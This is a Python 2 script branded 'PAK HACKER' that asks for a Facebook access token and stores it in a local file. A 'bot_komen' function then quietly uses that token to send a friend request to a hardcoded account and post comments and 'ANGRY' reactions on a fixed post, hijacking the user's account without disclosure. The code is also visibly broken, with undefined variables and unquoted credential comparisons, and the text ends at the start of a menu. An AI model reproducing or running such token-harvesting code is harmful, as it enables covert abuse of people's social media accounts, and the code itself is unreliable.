#!/usr/bin/python2

#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; CPH1923 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36')]

def keluar():

	print "\033[0;39m[!] \x1b[0;39mExit"	os.sys.exit()

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!'+w[random.randint(0,len(w)-1)]+i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))

    x += '\033[0m'

    x = x.replace('!0','\033[0m')

    sys.stdout.write(x+'\n')

def jalan(z):

	for e in z + '\n':

		sys.stdout.write(e)

		sys.stdout.flush()

		time.sleep(00000.1)

##### LOGO  #####

logo = """ 

\33[38;1mSHABIR BALOCH

\33[38;1mPAK HACKER 

\33[38;1mWE ARE ANONYMOUS 

\33[38;1mWE ARE LEGION 

\33[38;1m03232132362

\33[38;1mLoaded....100%

\033[0;35m[\033[0;92m •• \033[0;35m] Author   : Shabir Baloch

\033[1;34m\033[1;41;33m   \033[0m"""

def tik():

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\x1b[0;39mPlease Wait \x1b[0;39m"+o),;sys.stdout.flush();time.sleep(1)

back = 0

berhasil = []

cekpoint = []

oks = []

id = []

listgrup = []

vulnot = "\033[31mNot Vuln"

vuln = "\033[32mVuln"

os.system("clear")

print  """

\33[31;1mSHABIR BALOCH

\33[31;1mPAK HACKER

\33[31;1m 

\33[31;1m  

\33[31;1mCHANNEL NAME= B4 BALOCH M4 MASTER

\33[31;1mLOADING........

\033[0;39m[\033[0;92m •• \033[0;39m] Author   : Shabir Baloch

\033[1;39m\033[1;41;39m  1 \033[0m

\033[0;39m~~~~~~~~~~~~~~~~~~~~~~~~~~~"""

print("\033[0;92mUsername/Password: 786786")

print("\033[0;39m~~~~~~~~~~~~~~~~~~~~~~~~~~~")

CorrectUsername = "MAKERIMRAN"

CorrectPassword = "GFUIMRAN"

loop = 'true'

while (loop == 'true'):

    username = raw_input("\033[0;39m\x1b[0;39mUsername  \x1b[0;39m ")

    if (username == MAKERIMRAN):

    	password = raw_input("\033[0;39m\x1b[0;39mPassword  \x1b[0;39m ")

        if (password == GFUIMRAN):

            print "Logged in successfully as " + username

            loop = 'false'

        else:

            print "Wrong Password"

            os.system('python2 a')

    else:

        print "Wrong Username"

        os.system('python2 a')

###### Login ######

def masuk():

	os.system('clear')

	print logo

	print 50* "\033[0;39m"

	toket = raw_input("\033[0;39m[\033[0;92m> \033[0;39mToken :\033[0;93m ")

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)

		a = json.loads(otw.text)

		zedd = open("login.txt", 'w')

		zedd.write(toket)

		zedd.close()

		print '\033[0;39m\033[0;92m Login Successful'

		menu()

	except KeyError:

		print "\033[0;39m! \033[0;39mToken Invalid !"

		time.sleep(1.7)

		masuk()

		

###### BOT COMMENT #######

def bot_komen():

	try:

		toket=open('login.txt','r').read()

	except IOError:

		print"\033[1;39m[!] Token invalid"

		os.system('rm -rf login.txt')

	una = ('1741317224')

	kom = (' ')

	reac = ('ANGRY')

	post = ('10208284082656658')

	post2 = ('10208284082656658')

	kom2 = (' ')

	reac2 = ('ANGRY')

	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)

	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)

	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)

	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)

	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)

	menu()

			

def menu():

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		os.system('clear')

		print"\033[0;39m[!] Token invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		masuk()

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)

		a = json.loads(otw.text)

		nama = a['name']

		id = a['id']

		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)

		b = json.loads(ots.text)

		sub = str(b['summary']['total_count'])

	except KeyError:

		os.system('clear')

		print"\033[0;91mToken Invalid"

		os.system('python2 a')

		time.sleep(1)

		masuk()

	except requests.exceptions.ConnectionError:

		print"\033[0;39mThere is no internet connection"

		keluar()

	os.system("clear")

	print logo

	print
